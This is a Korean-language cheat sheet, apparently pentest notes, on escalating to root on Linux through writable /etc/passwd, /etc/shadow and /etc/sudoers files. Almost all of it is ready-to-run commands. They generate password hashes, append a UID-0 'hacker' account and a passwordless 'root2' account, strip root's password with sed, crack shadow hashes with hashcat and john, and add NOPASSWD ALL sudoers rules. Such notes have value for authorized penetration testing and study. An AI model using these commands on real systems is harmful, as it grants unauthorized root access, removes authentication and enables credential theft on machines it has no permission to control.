# 05_etc_passwd쓰기

# 리눅스 권한상승 — /etc/passwd 쓰기

---

## 확인

```bash
ls -la /etc/passwd
stat /etc/passwd
# -rw-rw-rw- 이면 공격 가능
```

---

## 패스워드 해시 생성

```bash
# openssl (가장 보편적)
openssl passwd -1 -salt hack pass123
# → $1$hack$xxxxxxxxxxxxxxxxxxxx

# python3
python3 -c "import crypt; print(crypt.crypt('pass123', '\$1\$hack\$'))"

# mkpasswd
mkpasswd -m md5crypt -s pass123
```

---

## root 계정 추가

```bash
# 패스워드 있는 계정
echo 'hacker:$1$hack$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker    # 패스워드: pass123

# 패스워드 없는 계정 (콜론 2개 = 빈 패스워드)
echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd
su root2     # 패스워드 없이 바로 root

# 기존 root 패스워드 제거 (UID 0 계정 직접 수정)
# 원본: root:x:0:0:root:/root:/bin/bash
# 수정: root::0:0:root:/root:/bin/bash (x를 제거하면 패스워드 없음)
sed -i 's/root:x:/root::/' /etc/passwd
su root
```

---

## /etc/shadow 읽기 가능할 때

```bash
cat /etc/shadow

# 해시 추출 후 크랙
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt    # sha512crypt
hashcat -m 500 shadow.txt /usr/share/wordlists/rockyou.txt     # md5crypt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

---

## /etc/sudoers 쓰기 가능할 때

```bash
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
echo '<현재사용자> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo su
```